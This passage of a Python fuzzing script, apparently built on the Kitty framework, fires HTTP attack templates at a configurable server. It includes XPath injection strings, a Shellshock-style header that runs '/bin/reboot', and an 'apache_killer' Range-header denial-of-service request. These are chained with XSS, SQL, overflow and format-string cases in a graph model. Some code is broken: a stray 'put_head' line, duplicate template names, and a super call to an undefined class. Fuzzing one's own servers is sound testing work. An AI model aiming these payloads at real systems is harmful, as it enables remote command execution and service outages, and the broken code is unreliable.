    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])




http_xpath_02 = Template(name='HTTP_Xpath_01', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='xpath0', fuzzable=False),
	String('\'+or+\'\'=\'', name='xpath1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])



http_xpath_03 = Template(name='HTTP_Xpath_01', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='xpath0', fuzzable=False),
	String('x\'+or+1=1+or+\'x\'=\'y', name='xpath1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])


http_xpath_04 = Template(name='HTTP_Xpath_01', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='xpath0', fuzzable=False),
	String('/', name='xpath1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])


http_xpath_05 = Template(name='HTTP_Xpath_01', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='xpath0', fuzzable=False),
	String('//', name='xpath1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])


#========================================================================
# Code Injection
http_code_01 = Template(name='http_code_01', fields=[
	String('GET / HTTP/1.1', name='method', fuzzable=False),
	Delimiter('\r\n\r\n', name='eom1', fuzzable=False),
	String('HTTP_USER_AGENT=() { :; }; /bin/', name='host', fuzzable=False),
	String('reboot', name='baststuff'),
])
 




#==================================================================
# Others



put_head = Template(name='put_head', fields=[
    String('PUT', name='method'),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
    Static('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
    Static('\r\n\r\n', name='eom'),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
    Static('Content-Length: ', name='proto'),
    Dword(182, name='num', encoder=ENC_INT_DEC),
    String('Hello World!', name='message')
])

del_head = Template(name='del_head', fields=[
    String('DELETE', name='method'),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
    Static('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
    Static('\r\n\r\n', name='eom')      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])

opt_head = Template(name='opt_head', fields=[
    String('OPTIONS', name='method'),           # 1. Method - a string with the value "GET"
    Delimiter(' /', name='space1'),          # 1.a The space between Method and Path
    String('*', name='path'),     # 2. Path - a string with the value "/index.html"
    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
    Static('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
    Static('\r\n\r\n', name='eom')      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])

trace_head = Template(name='trace_head', fields=[
    String('TRACE', name='method'),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
    Static('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
    Static('\r\n\r\n', name='eom')      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])


apache_killer = Template(name='apache_killer', fields=[
	String('HEAD / HTTP/1.1', name='method', fuzzable=False),
	Delimiter('\r\n\r\n', name='eom1', fuzzable=False),
	String('Host: ', name='host', fuzzable=False),
	String(URL, name='target', fuzzable=False),
	Delimiter('\r\n\r\n', name='eom2', fuzzable=False),
	String('Range: bytes=', name='range', fuzzable=False),
	Dword(0, name='num1', encoder=ENC_INT_DEC),
	Static('-', name='dash1'),
	Dword(0, name='num2', encoder=ENC_INT_DEC),
	Static(',', name='dash2'),
	Dword(0, name='num3', encoder=ENC_INT_DEC),
	Static('-', name='dash3'),
	Dword(0, name='num4', encoder=ENC_INT_DEC),
	Static(',', name='dash4'),
	Dword(0, name='num5', encoder=ENC_INT_DEC),
	Static('-', name='dash5'),
	Dword(0, name='num6', encoder=ENC_INT_DEC),
	Static(',', name='dash6'),
	Dword(0, name='num7', encoder=ENC_INT_DEC),
	Static('-', name='dash7'),
	Dword(0, name='num8', encoder=ENC_INT_DEC),
	Static(',', name='dash8'),
	Dword(0, name='num9', encoder=ENC_INT_DEC),
	Static('-', name='dash9'),
	Dword(0, name='num0', encoder=ENC_INT_DEC),
])









#=====================================================================
# HTTP Fuzzer
#=====================================================================
class TcpTarget(ServerTarget):
	def __init__(self, name, host, port, timeout=None, logger=None):
		## Call ServerTarget constructor
		super(TcpTarget, self).__init__(name, logger)
		## hostname of the target (the TCP server)
		self.host = host
		## port of the target
		self.port = port
		if (host is None) or (port is None):
			raise ValueError('host and port may not be None')
		## socket timeout (default: None)
		self.timeout = timeout
		## the TCP socket
		self.socket = None

	def pre_test(self, test_num):
		## call the super (report preparation etc.)
		super(TcpTarget, self).pre_test(test_num)
		## only create a socket if we don't have one
		if self.socket is None:
			sock = self._get_socket()
			## set the timeout
			if self.timeout is not None:
				sock.settimeout(self.timeout)
			## connect to socket
			sock.connect((self.host, self.port))
			## our TCP socket
			self.socket = sock

	def _get_socket(self):
		## Create a TCP socket
		return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	def post_test(self, test_num):
		## Call super, as it prepares the report
		super(TcpTarget, self).post_test(test_num)
		## close socket
		if self.socket is not None:
			self.socket.close()
			## set socket to none
			self.socket = None

	def _send_to_target(self, data):
		#print "data:"+ data
		print self.host
		print self.port
		self.socket.send(data)

	def _receive_from_target(self):
		return self.socket.recv(10000)


#=====================================================================
class LocalProcessController(BaseController):
	def __init__(self, name, process_path, process_args, process_env=None,logger=None):
		'''
		:param name: name of the object
		:param process_path: path to the target executable
		:param process_args: arguments to pass to the process
		:param logger: logger for this object (default: None)
		'''
		super(ClientProcessController, self).__init__(name, process_path, process_args,process_env, logger)
		assert(process_path)
		assert(os.path.exists(process_path))
		self._process_path = process_path
		self._process_name = os.path.basename(process_path)
		self._process_args = process_args
		self._process = None

	def pre_test(self, test_num):
		'''start the victim'''
		## stop the process if it still runs for some reason
		if self._process:
			self._stop_process()
		cmd = [self._process_path] + self._process_args
		## start the process
		self._process = Popen(cmd, stdout=PIPE, stderr=PIPE)
		## add process information to the report
		self.report.add('process_name', self._process_name)
		self.report.add('process_path', self._process_path)
		self.report.add('process_args', self._process_args)
		self.report.add('process_id', self._process.pid)

	def post_test(self):
		'''Called when test is done'''
		self._stop_process()
		## Make sure process started by us
		assert(self._process)
		## add process information to the report
		self.report.add('stdout', self._process.stdout.read())
		self.report.add('stderr', self._process.stderr.read())
		self.logger.debug('return code: %d', self._process.returncode)
		self.report.add('return_code', self._process.returncode)
		## if the process crashed, we will have a different return code
		self.report.add('failed', self._process.returncode != 0)
		self._process = None
		## call the super
		super(ClientProcessController, self).post_test()

	def teardown(self):
		'''
		Called at the end of the fuzzing session, override with victim teardown
		'''
		self._stop_process()
		self._process = None
		super(ClientProcessController, self).teardown()

	def _stop_process(self):
		if self._is_victim_alive():
			self._process.terminate()
			time.sleep(0.5)
			if self._is_victim_alive():
				self._process.kill()
				time.sleep(0.5)
				if self._is_victim_alive():
					raise Exception('Failed to kill client process')

	def _is_victim_alive(self):
		return self._process and (self._process.poll() is None)


#=====================================================================
if __name__=="__main__":
	test_name = 'Server fuzzer 1.0'
	test_session='fuzz'					# 'test' or 'fuzz'

	#---------------------------------------------
	# initialize fuzzer
	target=TcpTarget(NAME,HOST,PORT)
	target.pre_test(1)
	
	if test_session is 'test':
		# Simple test to verify connections
		buf=http_get_v1.render().tobytes()
		target.transmit(buf)
		print target._receive_from_target()
		sys.exit(0)


	fuzzer=ServerFuzzer(test_name)
	fuzzer.set_interface(WebInterface(HOST, PORT))

	# Set controller 
	#env = os.environ.copy()
	#env['DISPLAY'] = ':2'
	#controller = LocalProcessController(
	#	'LocalController',
	#	'/usr/bin/opera',
	#	'http://192.168.146.131:80'
	#	)
	#target.set_controller(controller)
	

	controller = EmptyController('EmptyController')
	target.set_controller(controller)
	
	#---------------------------------------------

	model = GraphModel('model_01')
	model.connect(http_get_01)
	model.connect(http_get_01, http_get_02)
	model.connect(http_get_02, http_get_03)
	model.connect(http_get_01, http_path_01)	#path
	model.connect(http_path_01, http_path_02)

	model.connect(http_path_02, http_xss_01)	#xss
	model.connect(http_path_02, http_xss_02)	#xss
	model.connect(http_path_02, http_xss_03)	#xss
	model.connect(http_path_02, http_xss_04)	#xss
	model.connect(http_path_02, http_xss_05)	#xss
	model.connect(http_path_02, http_xss_06)	#xss
	model.connect(http_path_02, http_xss_07)	#xss
	model.connect(http_path_02, http_xss_08)	#xss

	model.connect(http_xss_01, http_xml_01)		#xml
	model.connect(http_xss_02, http_xml_01)		#xml
	model.connect(http_xss_03, http_xml_01)		#xml
	model.connect(http_xss_04, http_xml_01)		#xml
	model.connect(http_xss_05, http_xml_01)		#xml
	model.connect(http_xss_06, http_xml_01)		#xml
	model.connect(http_xss_07, http_xml_01)		#xml
	model.connect(http_xss_08, http_xml_01)		#xml

	model.connect(http_xml_01, http_xml_02)
	model.connect(http_xml_02, http_xml_03)
	model.connect(http_xml_03, http_xml_04)
	model.connect(http_xml_04, http_xml_05)
	model.connect(http_xml_05, http_ovf_01)		#overflow 
	model.connect(http_ovf_01, http_ovf_02)
	model.connect(http_ovf_02, http_fmt_01)		#format string
	model.connect(http_fmt_01, http_fmt_02)
	model.connect(http_fmt_02, http_fmt_03)

	model.connect(http_fmt_03, http_sql_01)		#sql
	model.connect(http_fmt_03, http_sql_02)		#sql
	model.connect(http_fmt_03, http_sql_03)		#sql
	model.connect(http_fmt_03, http_sql_04)		#sql
	model.connect(http_fmt_03, http_sql_05)		#sql
	model.connect(http_fmt_03, http_sql_06)		#sql
	model.connect(http_fmt_03, http_sql_07)		#sql

	model.connect(http_sql_01, http_xpath_01)	#xpath
	model.connect(http_sql_02, http_xpath_01)	#xpath
	model.connect(http_sql_03, http_xpath_01)	#xpath
	model.connect(http_sql_04, http_xpath_01)	#xpath
	model.connect(http_sql_05, http_xpath_01)	#xpath
	model.connect(http_sql_06, http_xpath_01)	#xpath
	model.connect(http_sql_07, http_xpath_01)	#xpath

put_head



	#--------------------------------------------
	# Ready to fuzz
	fuzzer.set_model(model)
	fuzzer.set_target(target)


	fuzzer.start()


